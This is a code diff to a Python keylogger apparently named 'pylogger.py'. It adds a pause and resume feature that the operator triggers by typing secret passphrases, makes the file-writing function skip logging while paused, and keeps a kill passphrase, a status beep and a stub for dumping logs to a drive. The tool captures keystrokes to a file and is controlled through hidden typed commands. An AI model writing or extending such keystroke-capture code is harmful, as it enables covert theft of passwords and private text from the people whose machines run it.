@@ -28,6 +28,13 @@ kill_pass = "pykill"
 kill_pass_counter = 0
 kill_program_name = "pylogger.py"
 
+#Checkpass Vars
+pause_pass = "pypause"
+resume_pass = "pyresume"
+resume_pass_counter = 0
+pause_pass_counter = 0
+pause = False
+
 #Pause Vars
 status_pass = "pystatus"
 status_pass_counter = 0
@@ -142,13 +149,30 @@ def killSwitch(key):
     else:
         kill_pass_counter = 0;
 
-#Pause Switch - Keylogger won't log until resumed
+#Pause Switch - Toggle Logging to file On/Off
 def pauseSwitch(key):
-    i = "TODO"
+    global pause_pass_counter, resume_pass_counter
+    global pause
 
-#Resume Switch - Keylogger will start logging again
-def resumeSwitch(key):
-    i = "TODO"
+    if (not pause):
+        if (pause_pass[pause_pass_counter] == key):
+            pause_pass_counter = pause_pass_counter + 1
+            if (pause_pass_counter >= len(pause_pass)):
+                pause = True;
+
+        else:
+            resume_pass_counter = 0;
+            pause_pass_counter = 0;
+
+    else:
+        if (resume_pass[resume_pass_counter] == key):
+            resume_pass_counter = resume_pass_counter + 1
+            if (resume_pass_counter >= len(resume_pass)):
+                pause = False;
+
+        else:
+            resume_pass_counter = 0;
+            pause_pass_counter = 0;
 
 #Status Switch - Will beep to let you know its alive
 def statusSwitch(key):
@@ -165,12 +189,15 @@ def statusSwitch(key):
     else:
         status_pass_counter = 0;
 
-#Dump everything to a given directory
+#Dump everything to a given lettered drive
 def dumpSwitch(key):
     i = "TODO"
 
 #Write to File
 def writeToFile(key):
+
+    if (pause): return
+
     global open_type
     filename = filename_base+filename_ext
 
@@ -189,8 +216,6 @@ def writeToFile(key):
     target = open(filename,open_type)
     target.write(key)
     target.close();
-
-
 
 
 # create and register a hook manager 
